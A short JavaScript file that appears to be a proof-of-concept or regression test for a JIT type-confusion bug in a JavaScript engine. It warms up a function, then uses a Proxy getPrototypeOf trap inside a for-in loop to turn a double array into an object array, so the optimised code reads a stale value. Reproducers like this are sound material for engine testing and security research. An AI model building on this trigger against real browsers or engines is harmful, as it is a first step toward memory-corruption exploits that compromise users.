let gArr = [1.1, 2.2, 3.3];
let transitionArr = [1.1, 2.2];
transitionArr.x = {};
var p = new Proxy({}, {
    getPrototypeOf: function() {
        if (flag) {
            gArr[0] = {}
        }
    return {};
    }
})
let flag = false;

function foo() {
    gArr[1];
    for(let i in p) {}
    return gArr[0]
}
for( let i=0; i<0x10000; i++ ) {
    foo();
}

flag=true;

print(foo());
